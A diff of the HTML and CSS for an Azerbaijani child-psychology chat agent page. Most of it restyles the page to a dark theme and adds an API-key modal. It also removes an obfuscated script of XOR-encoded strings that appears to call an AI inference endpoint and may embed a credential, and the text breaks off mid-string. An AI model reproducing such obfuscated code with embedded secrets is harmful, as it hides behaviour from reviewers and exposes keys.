@@ -1,399 +1,598 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>AN PSİXOLOJİ – Peşəkar Uşaq Agent</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>AN PSİXOLOJİ – AI Agent</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --bg:#0f0e17;
+  --surface:#1a1928;
+  --surface2:#22203a;
+  --border:#2e2b4a;
+  --accent:#7c6ef5;
+  --accent2:#a78bfa;
+  --accent3:#e879f9;
+  --green:#34d399;
+  --orange:#fb923c;
+  --text:#f0eeff;
+  --text2:#9896b8;
+  --text3:#6b6987;
+  --bubble-agent:#1e1c35;
+  --bubble-user:linear-gradient(135deg,#7c6ef5,#a78bfa);
+  --radius:20px;
+  --font:'Plus Jakarta Sans',sans-serif;
+}
+body{font-family:var(--font);background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden}
 
-        body {
-            font-family: 'Segoe UI', 'Nunito', 'Comic Neue', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(145deg, #fff3e0 0%, #ffe6d5 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 12px;
-            overflow-x: hidden;
-        }
+/* === SPLASH === */
+.splash{position:fixed;inset:0;background:var(--bg);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;gap:20px;transition:opacity .5s}
+.splash.hide{opacity:0;pointer-events:none}
+.splash-logo{width:90px;height:90px;border-radius:28px;background:linear-gradient(135deg,#7c6ef5,#e879f9);display:flex;align-items:center;justify-content:center;font-size:2.5rem;animation:logoPulse 2s infinite;box-shadow:0 0 40px rgba(124,110,245,.4)}
+.splash-title{font-size:1.8rem;font-weight:800;background:linear-gradient(90deg,#a78bfa,#e879f9);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.splash-sub{font-size:.85rem;color:var(--text2);text-align:center;max-width:240px;line-height:1.6}
+.splash-dots{display:flex;gap:10px}
+.splash-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);animation:dotBounce 1.4s infinite}
+.splash-dot:nth-child(2){animation-delay:.2s}
+.splash-dot:nth-child(3){animation-delay:.4s}
 
-        /* Splash */
-        .splash {
-            position: fixed;
-            inset: 0;
-            background: linear-gradient(145deg, #ff9a3c, #ff5e7c, #d84c9c);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 10000;
-            transition: opacity 0.6s;
-        }
-        .splash.hide { opacity: 0; pointer-events: none; }
-        .splash-icon {
-            font-size: 4.5rem;
-            background: rgba(255,255,255,0.25);
-            border-radius: 50%;
-            width: 120px;
-            height: 120px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: floatPulse 1.6s infinite;
-            box-shadow: 0 15px 25px rgba(0,0,0,0.2);
-        }
-        .splash-title {
-            font-size: 2.2rem;
-            font-weight: 900;
-            color: white;
-            text-shadow: 0 2px 8px rgba(0,0,0,0.2);
-            letter-spacing: -0.5px;
-        }
-        .splash-sub {
-            font-size: 0.9rem;
-            color: rgba(255,255,255,0.95);
-            margin-top: 6px;
-            font-weight: 600;
-        }
-        .dot-group { display: flex; gap: 12px; margin-top: 28px; }
-        .dot {
-            width: 10px; height: 10px;
-            background: rgba(255,255,255,0.7);
-            border-radius: 50%;
-            animation: bounceDot 1.2s infinite;
-        }
+/* === API KEY MODAL === */
+.api-modal{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(8px);z-index:8000;display:flex;align-items:center;justify-content:center;padding:20px}
+.api-sheet{background:var(--surface);border:1px solid var(--border);border-radius:28px;padding:28px;width:100%;max-width:400px;display:flex;flex-direction:column;gap:16px}
+.api-sheet h3{font-size:1.1rem;font-weight:700;background:linear-gradient(90deg,#a78bfa,#e879f9);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.api-sheet p{font-size:.78rem;color:var(--text2);line-height:1.6}
+.api-input{background:var(--bg);border:1.5px solid var(--border);border-radius:14px;padding:12px 16px;color:var(--text);font-size:.85rem;font-family:var(--font);outline:none;width:100%;transition:.2s}
+.api-input:focus{border-color:var(--accent)}
+.api-btn{background:linear-gradient(135deg,#7c6ef5,#a78bfa);border:none;border-radius:14px;padding:13px;color:#fff;font-size:.9rem;font-weight:700;font-family:var(--font);cursor:pointer;transition:.15s}
+.api-btn:active{transform:scale(.97)}
+.api-note{font-size:.7rem;color:var(--text3);text-align:center}
+.api-note a{color:var(--accent2);text-decoration:none}
 
-        /* Əsas app konteyneri */
-        .app {
-            max-width: 550px;
-            width: 100%;
-            background: rgba(255,255,245,0.98);
-            border-radius: 44px;
-            overflow: hidden;
-            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.3);
-            display: flex;
-            flex-direction: column;
-            height: 90vh;
-            opacity: 0;
-            transition: opacity 0.4s;
-            backdrop-filter: blur(0px);
-        }
+/* === WRAPPER === */
+.app{width:100%;max-width:520px;height:100dvh;max-height:100dvh;display:flex;flex-direction:column;position:relative;overflow:hidden}
 
-        /* Header – yumşaq gradient */
-        .header {
-            background: linear-gradient(115deg, #f97316, #ec4899, #8b5cf6);
-            padding: 14px 18px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            color: white;
-            flex-shrink: 0;
-        }
-        .avatar {
-            width: 48px; height: 48px;
-            background: rgba(255,255,255,0.25);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.8rem;
-            position: relative;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-        }
-        .online-dot {
-            position: absolute;
-            bottom: 2px; right: 2px;
-            width: 12px; height: 12px;
-            background: #4ade80;
-            border-radius: 50%;
-            border: 2px solid #f97316;
-            animation: pulseGreen 2s infinite;
-        }
-        .header-info { flex: 1; min-width: 0; }
-        .header-info h2 {
-            font-size: 1.2rem;
-            font-weight: 800;
-            letter-spacing: -0.3px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .header-info p {
-            font-size: 0.65rem;
-            opacity: 0.9;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .btn-icon {
-            width: 38px; height: 38px;
-            background: rgba(255,255,255,0.2);
-            border: none;
-            border-radius: 50%;
-            cursor: pointer;
-            font-size: 1.1rem;
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: 0.2s;
-        }
-        .btn-icon:active { transform: scale(0.94); background: rgba(255,255,255,0.3); }
+/* === HEADER === */
+.header{background:var(--surface);border-bottom:1px solid var(--border);padding:14px 16px;display:flex;align-items:center;gap:12px;flex-shrink:0;backdrop-filter:blur(12px)}
+.h-avatar{width:46px;height:46px;border-radius:16px;background:linear-gradient(135deg,#7c6ef5,#e879f9);display:flex;align-items:center;justify-content:center;font-size:1.5rem;flex-shrink:0;position:relative}
+.online{position:absolute;bottom:-2px;right:-2px;width:13px;height:13px;background:var(--green);border-radius:50%;border:2.5px solid var(--surface);animation:onlinePulse 2s infinite}
+.h-info{flex:1;min-width:0}
+.h-name{font-size:1rem;font-weight:800;color:var(--text)}
+.h-status{font-size:.65rem;color:var(--green);display:flex;align-items:center;gap:5px;font-weight:600}
+.h-status::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--green);animation:onlinePulse 2s infinite}
+.h-actions{display:flex;gap:6px}
+.h-btn{width:36px;height:36px;border-radius:12px;background:var(--surface2);border:1px solid var(--border);color:var(--text2);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:1rem;transition:.15s}
+.h-btn:hover{background:var(--border);color:var(--text)}
 
-        /* TOPICS – 4 sütunlu grid (mobil uyğun) */
-        .topics {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 10px;
-            padding: 14px 12px;
-            background: #fffaf2;
-            border-bottom: 1px solid #ffdbb5;
-        }
-        .chip {
-            background: linear-gradient(110deg, #ffffff, #fff6ea);
-            border: 1px solid #ffcd94;
-            border-radius: 40px;
-            padding: 8px 4px;
-            font-size: 0.7rem;
-            font-weight: 800;
-            color: #bc6f1a;
-            text-align: center;
-            white-space: nowrap;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.03);
-        }
-        .chip i, .chip span { font-size: 0.85rem; }
-        .chip.active {
-            background: #f97316;
-            color: white;
-            border-color: #f97316;
-            box-shadow: 0 4px 10px rgba(249,115,22,0.3);
-        }
-        .chip:active { transform: scale(0.96); background: #f97316; color: white; }
+/* === TOPICS === */
+.topics{padding:12px 14px;display:flex;gap:8px;overflow-x:auto;flex-shrink:0;background:var(--bg);scrollbar-width:none;-webkit-overflow-scrolling:touch}
+.topics::-webkit-scrollbar{display:none}
+.chip{background:var(--surface);border:1px solid var(--border);border-radius:40px;padding:7px 14px;font-size:.72rem;font-weight:700;color:var(--text2);white-space:nowrap;cursor:pointer;display:flex;align-items:center;gap:6px;transition:all .2s;flex-shrink:0}
+.chip:hover{border-color:var(--accent);color:var(--accent2)}
+.chip.active{background:linear-gradient(135deg,#7c6ef5,#a78bfa);border-color:transparent;color:#fff;box-shadow:0 4px 14px rgba(124,110,245,.35)}
+.chip-icon{font-size:.9rem}
 
-        /* Chat sahəsi */
-        .chat {
-            flex: 1;
-            overflow-y: auto;
-            padding: 16px 12px;
-            display: flex;
-            flex-direction: column;
-            gap: 14px;
-            background: #fffdf8;
-        }
-        .message { display: flex; gap: 10px; align-items: flex-end; animation: fadeSlideUp 0.25s; }
-        .user-message { flex-direction: row-reverse; }
-        .agent-avatar, .user-avatar {
-            width: 34px; height: 34px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1rem;
-            flex-shrink: 0;
-            box-shadow: 0 3px 6px rgba(0,0,0,0.1);
-        }
-        .agent-avatar { background: linear-gradient(135deg, #f97316, #ec4899); }
-        .user-avatar { background: linear-gradient(135deg, #0d9488, #06b6d4); }
-        .bubble {
-            max-width: 78%;
-            padding: 10px 14px;
-            border-radius: 22px;
-            font-size: 0.85rem;
-            line-height: 1.5;
-            word-break: break-word;
-            overflow-wrap: break-word;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-        }
-        .agent-bubble {
-            background: white;
-            border: 1px solid #ffe0b5;
-            border-bottom-left-radius: 5px;
-            color: #3a2a1f;
-        }
-        .user-bubble {
-            background: linear-gradient(115deg, #f97316, #ec4899);
-            color: white;
-            border-bottom-right-radius: 5px;
-        }
-        .time { font-size: 0.55rem; color: #b98f63; margin-top: 4px; padding: 0 6px; font-weight: 500; }
-        .qr-wrap { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
-        .qr-btn {
-            background: #fff0e0;
-            border: 1px solid #ffd5aa;
-            border-radius: 40px;
-            padding: 5px 14px;
-            font-size: 0.65rem;
-            font-weight: 700;
-            color: #c46d1a;
-            cursor: pointer;
-            transition: 0.15s;
-        }
-        .qr-btn:active { background: #f97316; color: white; transform: scale(0.96); }
-        .typing {
-            background: #f0ede8;
-            border-radius: 26px;
-            padding: 12px 18px;
-            display: flex;
-            gap: 6px;
-            width: fit-content;
-        }
-        .typing span { width: 8px; height: 8px; background: #f97316; border-radius: 50%; animation: bounceDot 1.2s infinite; }
+/* === CHAT === */
+.chat{flex:1;overflow-y:auto;padding:16px 14px;display:flex;flex-direction:column;gap:14px;scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.chat::-webkit-scrollbar{width:4px}
+.chat::-webkit-scrollbar-track{background:transparent}
+.chat::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
 
-        /* Input sahəsi */
-        .input-area {
-            padding: 12px 14px 18px;
-            background: #fffcf5;
-            border-top: 1px solid #ffddb0;
-            flex-shrink: 0;
-        }
-        .input-row {
-            display: flex;
-            gap: 12px;
-            align-items: flex-end;
-        }
-        .input-wrap {
-            flex: 1;
-            background: #fef7ef;
-            border: 1.5px solid #ffd8aa;
-            border-radius: 34px;
-            padding: 8px 16px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        textarea {
-            flex: 1;
-            border: none;
-            outline: none;
-            background: transparent;
-            font-size: 0.85rem;
-            resize: none;
-            max-height: 80px;
-            font-family: inherit;
-            color: #2c241a;
-        }
-        .mic-btn, .send-btn {
-            width: 44px; height: 44px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-size: 1.2rem;
-            background: none;
-            border: none;
-            transition: 0.15s;
-        }
-        .mic-btn {
-            background: #ffefe2;
-            color: #f97316;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
-        }
-        .mic-btn.recording {
-            background: #ec4899;
-            color: white;
-            animation: micPulse 1s infinite;
-        }
-        .send-btn {
-            background: linear-gradient(115deg, #f97316, #ec4899);
-            color: white;
-            box-shadow: 0 4px 10px rgba(249,115,22,0.3);
-        }
-        .mic-btn:active, .send-btn:active { transform: scale(0.94); }
+.msg{display:flex;gap:10px;align-items:flex-end;animation:fadeUp .25s ease}
+.msg.user{flex-direction:row-reverse}
 
-        .footer {
-            text-align: center;
-            padding: 8px;
-            font-size: 0.6rem;
-            background: #fffaf2;
-            color: #b48c5c;
-            border-top: 1px solid #ffe0bb;
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            flex-shrink: 0;
-        }
-        a { color: #f97316; text-decoration: none; font-weight: 600; }
+.msg-avatar{width:32px;height:32px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:.95rem;flex-shrink:0}
+.msg-avatar.agent{background:linear-gradient(135deg,#7c6ef5,#a78bfa)}
+.msg-avatar.user{background:linear-gradient(135deg,#1e1c35,#2e2b4a);border:1px solid var(--border)}
 
-        .toast {
-            position: fixed; bottom: 85px; left: 50%; transform: translateX(-50%);
-            background: #2e241d;
-            color: #ffefdf;
-            border-radius: 50px;
-            padding: 8px 22px;
-            font-size: 0.7rem;
-            z-index: 1100;
-            white-space: nowrap;
-            font-weight: 600;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-        }
+.msg-body{max-width:76%;display:flex;flex-direction:column;gap:4px}
+.msg.user .msg-body{align-items:flex-end}
 
-        .modal-overlay {
-            position: fixed; inset: 0;
-            background: rgba(0,0,0,0.5);
-            z-index: 2000;
-            display: flex;
-            align-items: flex-end;
-        }
-        .modal-sheet {
-            background: #fff9f0;
-            width: 100%; max-width: 550px;
-            border-radius: 36px 36px 0 0;
-            padding: 20px 20px 30px;
-            animation: slideUp 0.3s;
-        }
-        .modal-handle { width: 50px; height: 5px; background: #ffc48a; border-radius: 6px; margin: 0 auto 16px; }
+.bubble{padding:11px 15px;border-radius:18px;font-size:.83rem;line-height:1.6;word-break:break-word}
+.bubble.agent{background:var(--bubble-agent);border:1px solid var(--border);border-bottom-left-radius:5px;color:var(--text)}
+.bubble.user{background:var(--bubble-user);border-bottom-right-radius:5px;color:#fff}
+.bubble strong{color:var(--accent2);font-weight:700}
+.bubble em{color:var(--text2);font-style:normal}
 
-        /* Animasiyalar */
-        @keyframes floatPulse {
-            0%,100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.4); }
-            50% { transform: scale(1.1); box-shadow: 0 0 0 18px rgba(255,255,255,0); }
-        }
-        @keyframes bounceDot {
-            0%,80%,100% { transform: scale(0.6); opacity: 0.4; }
-            40% { transform: scale(1.2); opacity: 1; }
-        }
-        @keyframes fadeSlideUp {
-            from { opacity: 0; transform: translateY(12px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes pulseGreen {
-            0%,100% { box-shadow: 0 0 0 0 rgba(74,222,128,0.5); }
-            50% { box-shadow: 0 0 0 5px rgba(74,222,128,0); }
-        }
-        @keyframes micPulse {
-            0%,100% { box-shadow: 0 0 0 0 rgba(236,72,153,0.5); }
-            50% { box-shadow: 0 0 0 8px rgba(236,72,153,0); }
-        }
-        @keyframes slideUp {
-            from { transform: translateY(100%); }
-            to { transform: translateY(0); }
-        }
+.msg-time{font-size:.58rem;color:var(--text3);padding:0 4px;font-weight:500}
 
-        /* Kiçik ekranlarda çip yazıları bir az kiçilə bilər */
-        @media (max-width: 450px) {
-            .topics { gap: 6px; padding: 10px 8px; }
-            .chip { font-size: 0.65rem; padding: 6px 2px; white-space: nowrap; }
-            .chip i { font-size: 0.75rem; }
-            .bubble { max-width: 85%; font-size: 0.8rem; }
-        }
-    </style>
+/* Quick replies */
+.qr-wrap{display:flex;flex-wrap:wrap;gap:7px;margin-top:10px}
+.qr-btn{background:var(--surface2);border:1px solid var(--border);border-radius:30px;padding:6px 12px;font-size:.68rem;font-weight:600;color:var(--text2);cursor:pointer;transition:.15s;white-space:nowrap;font-family:var(--font)}
+.qr-btn:hover{border-color:var(--accent);color:var(--accent2)}
+.qr-btn:active{transform:scale(.96)}
+
+/* Typing */
+.typing-wrap{display:flex;gap:10px;align-items:center}
+.typing-bubble{background:var(--bubble-agent);border:1px solid var(--border);border-radius:18px;border-bottom-left-radius:5px;padding:12px 18px;display:flex;gap:7px;align-items:center}
+.typing-dot{width:7px;height:7px;border-radius:50%;background:var(--accent);animation:dotBounce 1.4s infinite}
+.typing-dot:nth-child(2){animation-delay:.2s}
+.typing-dot:nth-child(3){animation-delay:.4s}
+
+/* Specialist card inside bubble */
+.spec-cards{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px}
+.spec-card{background:var(--surface2);border:1px solid var(--border);border-radius:16px;padding:12px 10px;text-align:center;cursor:pointer;transition:.2s;display:flex;flex-direction:column;align-items:center;gap:6px}
+.spec-card:hover{border-color:var(--accent);transform:translateY(-2px)}
+.spec-card-icon{font-size:1.6rem}
+.spec-card-name{font-size:.72rem;font-weight:700;color:var(--text)}
+.spec-card-desc{font-size:.6rem;color:var(--text2)}
+
+/* === INPUT === */
+.input-area{padding:12px 14px 20px;background:var(--bg);border-top:1px solid var(--border);flex-shrink:0}
+.input-row{display:flex;gap:10px;align-items:flex-end}
+.input-box{flex:1;background:var(--surface);border:1.5px solid var(--border);border-radius:18px;padding:10px 14px;display:flex;align-items:flex-end;gap:8px;transition:.2s}
+.input-box:focus-within{border-color:var(--accent)}
+textarea{flex:1;background:transparent;border:none;outline:none;color:var(--text);font-size:.85rem;font-family:var(--font);resize:none;max-height:80px;line-height:1.5}
+textarea::placeholder{color:var(--text3)}
+.mic-btn{width:40px;height:40px;border-radius:14px;background:var(--surface2);border:1px solid var(--border);color:var(--text2);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:1.1rem;transition:.15s;flex-shrink:0}
+.mic-btn.rec{background:rgba(251,99,99,.15);border-color:#fb6363;color:#fb6363;animation:micPulse 1s infinite}
+.send-btn{width:40px;height:40px;border-radius:14px;background:linear-gradient(135deg,#7c6ef5,#a78bfa);border:none;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:1.1rem;transition:.15s;flex-shrink:0;box-shadow:0 4px 14px rgba(124,110,245,.35)}
+.send-btn:active,.mic-btn:active{transform:scale(.92)}
+
+/* === FOOTER === */
+.footer{text-align:center;padding:8px;font-size:.62rem;color:var(--text3);border-top:1px solid var(--border);flex-shrink:0;background:var(--bg)}
+.footer a{color:var(--accent2);text-decoration:none;font-weight:600}
+
+/* === TOAST === */
+.toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%);background:var(--surface);border:1px solid var(--border);color:var(--text);border-radius:30px;padding:9px 20px;font-size:.72rem;font-weight:600;z-index:5000;white-space:nowrap;box-shadow:0 8px 24px rgba(0,0,0,.4);animation:fadeUp .2s ease}
+
+/* === MODAL === */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);z-index:4000;display:flex;align-items:flex-end;justify-content:center;padding:0 0 0}
+.modal-sheet{background:var(--surface);border:1px solid var(--border);border-radius:28px 28px 0 0;padding:22px 20px 36px;width:100%;max-width:520px;animation:slideUp .3s ease}
+.modal-handle{width:44px;height:4px;background:var(--border);border-radius:4px;margin:0 auto 18px}
+.modal-title{font-size:1rem;font-weight:800;margin-bottom:14px;background:linear-gradient(90deg,#a78bfa,#e879f9);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.spec-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.spec-item{background:var(--surface2);border:1px solid var(--border);border-radius:18px;padding:14px 12px;text-align:center;cursor:pointer;transition:.2s}
+.spec-item:hover{border-color:var(--accent);transform:translateY(-2px)}
+.spec-item-icon{font-size:2rem;margin-bottom:6px}
+.spec-item-name{font-size:.8rem;font-weight:700;color:var(--text)}
+.spec-item-role{font-size:.62rem;color:var(--text2);margin-top:2px}
+.modal-warn{margin-top:14px;background:rgba(251,146,60,.08);border:1px solid rgba(251,146,60,.2);border-radius:16px;padding:12px 14px;font-size:.7rem;color:var(--orange);line-height:1.6}
+
+/* === ANIMATIONS === */
+@keyframes logoPulse{0%,100%{box-shadow:0 0 40px rgba(124,110,245,.4)}50%{box-shadow:0 0 60px rgba(232,121,249,.5)}}
+@keyframes onlinePulse{0%,100%{opacity:1}50%{opacity:.5}}
+@keyframes dotBounce{0%,60%,100%{transform:translateY(0);opacity:.5}30%{transform:translateY(-7px);opacity:1}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+@keyframes micPulse{0%,100%{box-shadow:0 0 0 0 rgba(251,99,99,.4)}50%{box-shadow:0 0 0 8px rgba(251,99,99,0)}}
+</style>
 </head>
 <body>
-<div id="root"></div>
 
-<script>(function(){var _ihgv=["LAYGBgYJCQYbGxsbGxsbGxsbGxsbGxsGYW9ybnNkBmdvBg5hdnILEkkLS09ITw8GxKa1BnJpfnNoc2pr","Z39vZAYbGxsbGxsbGxsbGxsbGxssBgYGBkVJSFVSBmFvcm5zZHlyaW1jaAYbBgRBTlZ5XlRWcmteR3VW","RGpgHhBoX35DZ0BKTX9QbERpYn5TFl9faxAeBB0GBgkJBuWwXAZSSU1DSE9IT1xK778G779Q779cBkNC","T0gsBgYGBiwGBgYGR1VfSEUGQFNIRVJPSUgGRUdKSnZUSUBDVVVPSUhHSmdvDlZUSUtWUg8GXSwGBgYG","BgYGBkVJSFVSBlRDVVZJSFVDBhsGR1FHT1IGQENSRU4OAU5SUlZVHAkJS0lCQ0pVCE9IQENUQ0hFQwhH","TwhHXFNUQwhFSUsJRU5HUglFSUtWSkNST0lIVQEKBl0sBgYGBgYGBgYGBgYGS0NSTklCHAYBdml1cgEK","LAYGBgYGBgYGBgYGBk5DR0JDVFUcBl0GAWdTUk5JVE9cR1JPSUgBHAZGZENHVENUBgJdYW9ybnNkeXJp","bWNoW0YKBgFlSUhSQ0hSC3JfVkMBHAYBR1ZWSk9FR1JPSUgJTFVJSAEGWwosBgYGBgYGBgYGBgYGRElC","XxwGbHVpaAhVUlRPSEFPQF8OXSwGBgYGBgYGBgYGBgYGBgYGS0lCQ0ocBgFBVlILEkkLS09ITwEKLAYG","BgYGBgYGBgYGBgYGBgZLQ1VVR0FDVRwGfSwGBgYGBgYGBgYGBgYGBgYGBgYGBl0GVElKQxwGBFVfVVJD","SwQKBkVJSFJDSFIcBgR1779IBgFnaAZ2deKWfmlqaWzilgEGR0JK4pcGT15ST1VHVUpH47lL4pfjuQZn","bwZHQUNIUk9V779ICAZz47lHVwZWVU9eSUpJV1MKBkpJV0lWQ0IKBkNUV0lSQ1RHVkNQUgZQ778GVlVP","XklWQ0JHV0lXBk1PS08G5YFHSuKX47nil1RVR0gIBm7vv1QGRUdQR0RCRxwGFw8G4pZVUk8GQU9UT+O5","BhQPBnVHQu+/Bkvvv0pTS0dSBhUPBhULEwZWVEdNUk9NTwZDUAZHQkLil0vilwYSDwZo778GQ1JL779f","T0gGEw8GcuWQUFVPX++/BhAPBmvlmlLvv17vv1VVT1XvvwZI778GUEdeUggGZ1zvv1RER19FR0gGQk9K","T0hC778KBkNLSUxPBk9VUk9AR0LvvwZDUggGYk9HV0hJXAZQQ1RL778IBAZbCiwGBgYGBgYGBgYGBgYG","BgYGBgYGBl0GVElKQxwGBFNVQ1QECgZFSUhSQ0hSHAZWVElLVlIGWywGBgYGBgYGBgYGBgYGBgYGewos","BgYGBgYGBgYGBgYGBgYGBktHXnlSSU1DSFUcBhcWFhYKLAYGBgYGBgYGBgYGBgYGBgZSQ0tWQ1RHUlNU","QxwGFggRLAYGBgYGBgYGBgYGBlsPLAYGBgYGBgYGWw8dLAYGBgYGBgYGT0AGDgdUQ1VWSUhVQwhJTQ8G","XSwGBgYGBgYGBgYGBgZFSUhVUgZDVFQGGwZHUUdPUgZUQ1VWSUhVQwhSQ15SDg8dLAYGBgYGBgYGBgYG","BlJOVElRBkhDUQZjVFRJVA5GbnJydgYCXVRDVVZJSFVDCFVSR1JTVVscBgJdQ1RUW0YPHSwGBgYGBgYG","BlssBgYGBgYGBgZFSUhVUgZCR1JHBhsGR1FHT1IGVENVVklIVUMITFVJSA4PHSwGBgYGBgYGBlRDUlNU","SAZCR1JHCEVOSU9FQ1V9FnsIS0NVVUdBQwhFSUhSQ0hSHSwGBgYGWywsBgYGBgkJBhsbGxsbGxsbGxsb","GxsbGwZtaWhg4pZ3c3RndeKWf2cGDmvlsHB8c2pndA8GGxsbGxsbGxsbGxsbGxsbLAYGBgZFSUhVUgZy","aXZvZXUGGwZ9LAYGBgYGBgYGXU1DXxwER1NST1xLBAoGT0VJSBwE1rmykwQKBkpHRENKHARnU1JPXEsE","WwosBgYGBgYGBgZdTUNfHARIT1JXBAoGT0VJSBwE1rmxhcmeqQQKBkpHRENKHARoT1JXBFsKLAYGBgYG","BgYGXU1DXxwEQkdQVEdIT1UECgZPRUlIHATWub6CBAoGSkdEQ0ocBGJHUFRHSOKX47kEWwosBgYGBgYG","BgZdTUNfHARCQ05EBAoGT0VJSBwExLyHBAoGSkdEQ0ocBGJjbmQEWwosBgYGBgYGBgZdTUNfHARDS0lV","T19HBAoGT0VJSBwExLuCyZ6pBAoGSkdEQ0ocBGNLSVVPX0cEWwosBgYGBgYGBgZdTUNfHARJX1NIBAoG","T0VJSBwE1rmoiAQKBkpHRENKHARpX1NIBnJDVEdWT19HVeKXBFsKLAYGBgYGBgYGXU1DXxwESV5TS0cE","CgZPRUlIHATWubW8BAoGSkdEQ0ocBGleU0tHCX9HXEtHBFsKLAYGBgYGBgYGXU1DXxwEVUlVT0dKBAoG","T0VJSBwE1rm3jQQKBkpHRENKHAR1SVVPR0oGZEdFR1Til1cEWywGBgYGex0sLAYGBgZFSUhVUgZyaXZv","ZXl2dGlrdnJ1BhsGXSwGBgYGBgYGBkdTUk9cSxwGBGdTUk9cSwZVVkNNUlQGVklcU0hSU1VTBklKR0gG","U+O5R1dKR1QGTkdXV+KXSEJHBu+/UlRHQErilwZL779KU0tHUgZQQ1QIBuCpSkdL779SSu+/VAoGUEdK","T0JDX0gGQ1BC778GSO+/BkNC778GRE9K779UCgZOR0hV4pcGUkNUR1ZPX0dKR1QGTeWQS++/TQZDQk9U","CgZB5ZpIQu+/Sk9NBlRTUk9IBkhDRe+/BldTVFNKS0dK4pdC4pdUGQQKLAYGBgYGBgYGSE9SVxwGBHPj","uUdXSkdUQkcGSE9SVwZBQ0VPTUvvv0rvv1RPBk5HV1fil0hCRwZL779KU0tHUgZQQ1QIBn9H47lHBkHl","kFTvvwZISVRLR0oGSE9SVwZPSE1P47lHQOKXBkhJVEtHSkdU4pcKBkNQQu+/BkNC778GRE9KT0jvv0Xv","v00GS++/47lXSu+/VAoGSklXSVZDQu+/BkjvvwZQR15SBkvlmlRHRU/vv1IGQ1JL779NBkpHXOKXS0Li","l1QZBAosBgYGBgYGBgZCR1BUR0hPVRwGBH7lmlVTVU8GQ05ST19HRUrilwZT47lHV0pHVEJHBkJHUFRH","SOKX47kGVlRJREpDS0rvv1RPSE8GDkdXVENVVU9fRwoG5ZBc5ZpI778GXO+/VO+/VAoGT1JH779SVU9c","Sk9NDwZIQ0XvvwZPQkdU778GQ1JL779NBklKR1QZBAosBgYGBgYGBgZCQ05EHAYEYmNuZAZJSkdIBlPj","uUdXSkdUBk5HV1fil0hCRwbvv1JUR0BK4pcGS++/SlNLR1IGUENUCAbgqUpHS++/Ukrvv1QKBkNQQu+/","Bk3lkEvvv00G5ZpVU0pKR1TilwoGS++/TVLvv0RC778GQu+/VVLvv00IBAosBgYGBgYGBgZDS0lVT19H","HAYEfuWaVVNVTwZDTlJPX0dFSuKXBlPjuUdXSkdUQkcGQ0tJVU9JSEdKBk9ITU/juUdABlDvvwZDS0lV","T19HBlLvv0hcT0tK779L778GREdFR1Til1dKR1TilwgECiwGBgYGBgYGBklfU0gcBgRpX1NIBlJDVEdW","T19HVeKXBkjvv0JPVBkGfuWaVVNVTwZDTlJPX0dFSuKXBlPjuUdXSkdUBuWa5YHlmkgGQ1BC778GUu+/","UkRPVwZDQk9K778GRE9K779F779NBklfU0gGSOWQUErvv1RPCAQKLAYGBgYGBgYGSV5TS0ccBgRz47lH","V0pHVEJHBkleU0tHC19HXEt